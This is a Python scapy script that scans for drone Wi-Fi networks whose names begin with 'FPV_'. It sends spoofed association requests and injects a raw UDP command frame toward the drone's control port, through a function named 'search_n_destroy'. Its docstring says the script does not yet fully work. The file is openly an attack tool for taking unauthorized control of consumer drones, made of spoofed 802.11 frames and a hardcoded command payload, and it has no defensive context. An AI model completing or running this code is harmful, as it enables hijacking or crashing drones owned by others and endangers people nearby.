#!python
"""
Not quite working script.

Seems like the drone expects at very least proper wifi association, and likely
DHCP request&acknowledgment as well before we can start sending commands to it.
"""

import pathlib
import queue
import subprocess

import fire
from scapy.layers.dot11 import (
    Dot11,
    Dot11AssoReq,
    Dot11Beacon,
    Dot11Elt,
    Dot11FCS,
    Dot11QoS,
    RadioTap,
)
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import LLC, SNAP
from scapy.packet import Raw
from scapy.sendrecv import AsyncSniffer, sendp


def sniff_gen(**kwargs):
    pkts = queue.SimpleQueue()
    t = AsyncSniffer(store=False, prn=pkts.put, **kwargs)
    t.start()
    try:
        while True:
            yield pkts.get()
    except KeyboardInterrupt:
        pass
    t.stop()


def setup_monitor(iface: str):
    here = pathlib.Path(__file__).parent
    subprocess.check_call([str(here / "setup_monitor.sh"), iface])


def send_asso_req(client_mac, bssid, ssid):
    association_request = (
        RadioTap()
        / Dot11(
            proto=0,
            FCfield=0,
            subtype=0,
            addr2=client_mac,
            addr3=bssid,
            addr1=bssid,
            type=0,
        )
        / Dot11AssoReq(listen_interval=5, cap=12548)
        / Dot11Elt(info=ssid, ID=0, len=len(ssid))
        / Dot11Elt(info="\x02\x04\x0b\x16\x0c\x12\x18$", ID=1, len=8)
        / Dot11Elt(info="0H`l", ID=50, len=4)
        / Dot11Elt(info="\x00P\xf2\x02\x00\x01\x00", ID=221, len=7)
        / Dot11Elt(
            info="\x00P\xf2\x04\x10J\x00\x01\x10\x10:\x00\x01\x02", ID=221, len=14
        )
    )

    return association_request


def search_n_destroy(iface: str):

    setup_monitor(iface)
    pkts_stream = sniff_gen(iface=iface)

    for pkt in pkts_stream:
        if Dot11Beacon in pkt:
            beacon = pkt[Dot11Beacon]
            network = beacon.network_stats()
            ssid = network.get("ssid")
            if ssid and ssid.startswith("FPV_"):
                print(network)

                sender = "b2:43:f6:64:a2:bb"
                bssid = "14:6b:9c:58:75:07"
                frame = send_asso_req(sender, bssid, ssid)
                sendp(frame, iface=iface)

                frame = (
                    RadioTap()
                    / Dot11FCS(
                        subtype=8,
                        type="Data",
                        proto=0,
                        FCfield="to-DS",
                        addr1=bssid,
                        addr2=sender,
                        addr3=bssid,
                    )
                    / Dot11QoS(Reserved=0, Ack_Policy=0, EOSP=0, TID=0, TXOP=0)
                    / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
                    / SNAP(OUI=0x0, code="IPv4")
                    / IP(version=4, proto="udp", src="172.16.10.187", dst="172.16.10.1")
                    / UDP(sport=6666, dport=5555)
                    / Raw(
                        load=bytes.fromhex(
                            "436d640001001200010404000a000000808080802020202010652f"
                        )
                    )
                )
                print(frame)

                sendp(frame, iface=iface)


if __name__ == "__main__":
    fire.Fire(search_n_destroy)
